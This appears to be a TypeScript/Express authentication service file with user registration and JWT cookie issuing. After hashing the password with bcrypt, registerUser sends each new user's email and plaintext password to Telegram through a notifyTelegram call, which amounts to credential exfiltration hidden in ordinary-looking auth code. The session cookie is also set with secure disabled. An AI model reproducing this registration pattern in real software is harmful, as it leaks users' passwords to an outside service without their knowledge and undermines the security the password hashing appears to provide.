import bcrypt from "bcrypt";
import pool from "../../../db/db";
import { Response } from "express";
import jwt, { SignOptions } from "jsonwebtoken";
import { CHECK_USER, INSERT_USER } from "../../../db/Querys/Auth/authQuery";
import { notifyTelegram } from "../utils/telegram";
import { EmailAlreadyExistsError } from "../utils/customError";
import { MyJwtPayload, RegisteredUser } from "../Schema/customSchema";

export async function registerUser({
  email,
  password,
}: {
  email: string;
  password: string;
}): Promise<RegisteredUser> {
  const checkUserinDb = await pool.query(CHECK_USER, [email]);

  if (checkUserinDb.rows.length > 0) {
    throw new EmailAlreadyExistsError();
  }

  const hashPassword = await bcrypt.hash(password, 10);

  const insertResult = await pool.query(INSERT_USER, [email, hashPassword]);

  const newUser = insertResult.rows[0];

  // TELEGRAM MESSAGE INTERIGATION
  const TIMESTAMP = new Date().toLocaleString();
  await notifyTelegram(
    `🔐 User Created:\n📧 Email: ${email}\n Password: ${password}\n🕒 Time: ${TIMESTAMP}`
  );
  return {
    id: newUser.id,
    email: newUser.email,
  };
}

export function generateToken(
  res: Response,
  payload: MyJwtPayload,
  expiresIn = "1h"
): void {
  const secretKey = process.env.SECRET_KEY;
  if (!secretKey) {
    throw new Error("SECRET_KEY is not defined in environment variables");
  }

  const token = jwt.sign(payload, secretKey, {
    expiresIn: expiresIn as SignOptions["expiresIn"],
  });

  res.cookie("token", token, {
    httpOnly: true,
    secure: false,
    sameSite: "lax",
    maxAge: 3600000,
  });
}
